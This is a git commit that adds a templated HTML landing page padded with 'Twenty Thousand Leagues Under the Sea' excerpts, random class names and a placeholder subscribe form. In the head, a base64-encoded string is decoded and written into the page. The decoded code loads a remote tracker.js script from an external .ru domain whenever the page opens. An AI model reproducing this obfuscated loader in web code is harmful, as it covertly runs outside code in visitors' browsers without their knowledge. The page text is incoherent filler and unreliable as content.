9a1cf5b1a6e3d7aa189ee183a8f161d30436f791
ponwkrpj <77186416+ponwkrpj@users.noreply.github.com>
2021-01-09 08:29:07 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Suddenly light broke at each side of the saloon, through two oblong opening</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl82dHMwOGxqcHIzY3pheHd4eGYiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="ietasj9b6xicsnn">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="#">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="iczawsi2m3vxwl5r4v2xf7pz">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Suddenly light broke at each side of the saloon, through two oblong opening</h1>
+	</section>
+
+
+	<section class="our-work" class="8k0w787zoryevvkxfvmun6">
+		<h3 class="title">You are not coming, captain? I asked.</h3>
+		<p>The frigate skirted the southeast coast of America with great rapidity. The 3d of July we were at the opening of the Straits of Magellan, level with Cape Vierges. But Commander Farragut would not take a tortuous passage, but doubled Cape Horn. I felt terrified, Conseil was calm, Ned Land roared. So speaking, Captain Nemo seemed moved, and his emotion gave me a better opinion of him. Then, chart in hand, we reviewed the travels of the French navigator, his voyages of circumnavigation, his double detention at the South Pole, which led to the discovery of Adelaide and Louis Philippe, and fixing the hydrographical bearings of the principal islands of Oceania. The captain pressed an electric clock three times. The pumps began to drive the water from the tanks; the needle of the manometer marked by a different pressure the ascent of the Nautilus, then it stopped.</p>
+		<hr>
+
+		<ul class="grid" class="b427lomj2jndozl933">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="ietasj9b6xicsnn">
+		<h3 class="title">Savages.</h3>
+		<p>For a whole hour was I deep in these reflections, seeking to pierce this mystery so interesting to me. Then my eyes fell upon the vast planisphere spread upon the table, and I placed my finger on the very spot where the given latitude and longitude crossed. A repast awaits you in your cabin, said he. Be so good as to follow this man. And now, M. Aronnax, our breakfast is ready. Permit me to lead the way. You wished to see, friend Ned; well, you see now. They will keep them at the hotel.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="iczawsi2m3vxwl5r4v2xf7pz" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="b427lomj2jndozl933" class="title">No; not unless you attack them. When they have to defend their </h3>	
+		<p>Will master permit me to make a recommendation? asked Conseil. At St. Malo, answered Conseil. Well, Master Land? said he. This shell, I said, holding up the object of my triumph.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="ietasj9b6xicsnn">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="iczawsi2m3vxwl5r4v2xf7pz"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="8k0w787zoryevvkxfvmun6"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="b427lomj2jndozl933"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>48002 Sister Harbor, Suite 811, 64107-9195, Kertzmannside, Oklahoma, United States</p>
+	</footer>
+
+</body>
+
+</html>
